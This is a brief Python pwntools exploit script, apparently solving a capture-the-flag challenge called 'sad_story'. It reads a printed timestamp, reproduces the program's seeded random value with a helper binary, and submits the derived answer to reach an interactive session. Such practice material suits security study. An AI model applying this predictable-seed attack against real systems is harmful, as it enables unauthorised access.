#!/usr/bin/env python
from pwn import *
import sys
import subprocess
HOST = 'None'
PORT = None

def info(s):
	log.info(s)

def exploit(p):
	p.recvuntil('Now is ')
	now=p.recvline()[:-1]
	info("seed is %d"%int(now))
	r=subprocess.check_output(['./sub',now])
	r=int(r)
	info("random is: %d\n"%r)
	info("name is "+str(int(now)-r))
	p.sendlineafter('I will bring u back, give me the time: ',str(int(now)-r))
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./sad_story')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
